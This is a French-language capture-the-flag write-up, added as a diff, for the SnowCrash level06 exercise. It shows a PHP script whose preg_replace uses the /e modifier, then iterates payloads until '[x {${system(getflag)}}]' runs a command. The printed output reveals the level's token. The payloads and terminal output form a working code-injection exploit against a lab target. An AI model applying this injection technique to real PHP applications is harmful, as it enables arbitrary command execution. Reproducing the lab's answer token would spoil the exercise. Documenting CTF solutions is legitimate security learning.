@@ -1,0 +1,43 @@
+Ici on a 2 fichiers
+un fichier php qui contient des regex dans tout les sens
+et son exivalent compilé j'imagine
+
+Apres une recherche rapide on vois que cette fonction php dans level06.php présente une faille qui est le /e
+le /e va exécuter le texte comme du code
+
+on voit que la fonction prend 2 paramètres en entrée et qu'on veux que le 1er soit passé a /e
+
+<?php
+function y($m) { $m = preg_replace("/\./", " x ", $m); $m = preg_replace("/@/", " y", $m); return $m; }
+function x($y, $z) { $a = file_get_contents($y); $a = preg_replace("/(\[x (.*)\])/e", "y(\"\\2\")", $a); $a = preg_replace("/\[/", "(", $a); $a = preg_replace("/\]/", ")", $a); return $a; }
+$r = x($argv[1], $argv[2]); print $r;
+?>
+
+on va commencer par un echo dans un fichier
+on formate avec [x lecondequonveux]
+echo '[x system(getflag)]' > /tmp/test
+puis ./level06 /tmp/test nimportequoi
+resultat : system(getflag)
+/e n'as pas compris qu'il s'agissait d'une commande
+
+il va nous falloire encapsuer system(getflag) pour tromper le /e de php_check_syntax
+en utilisant ${} on va indiquer a php que ce qu'il y a au milieu est une variable php
+echo '[x ${system(getflag)}]' > /tmp/test
+
+level06@SnowCrash:~$ ./level06 /tmp/test aa
+PHP Parse error:  syntax error, unexpected '(' in /home/user/level06/level06.php(4) : regexp code on line 1
+PHP Fatal error:  preg_replace(): Failed evaluating code: 
+y("${system(getflag)}") in /home/user/level06/level06.php on line 4
+
+Dans notre cas php va comprendre system(getflag) comme un nom de variable et les () ne sont pas authorisé d'ou l'erreur
+
+l'astuce ici ca va etre d'encapsuler a nouveau cette déclaration pour indiquer a php d'exécuté en premier system(getflag)
+puis de traiter le resultat comme une variable PHP
+level06@SnowCrash:~$ echo '[x {${system(getflag)}}]' > /tmp/test
+level06@SnowCrash:~$ ./level06 /tmp/test aa
+PHP Notice:  Use of undefined constant getflag - assumed 'getflag' in /home/user/level06/level06.php(4) : regexp code on line 1
+Check flag.Here is your token : wiok45aaoguiboiki2tuin6ub
+PHP Notice:  Undefined variable: Check flag.Here is your token : wiok45aaoguiboiki2tuin6ub in /home/user/level06/level06.php(4) : regexp code on line 1
+
+On va toujours avoir une erreur car "Check flag.Here is your token : wiok45aaoguiboiki2tuin6ub in /home/user/level06/level06.php(4)" pour un nom de variable c'est pas correct
+En revanche on a réussis a récupéré l'information qu'il nous fallait !
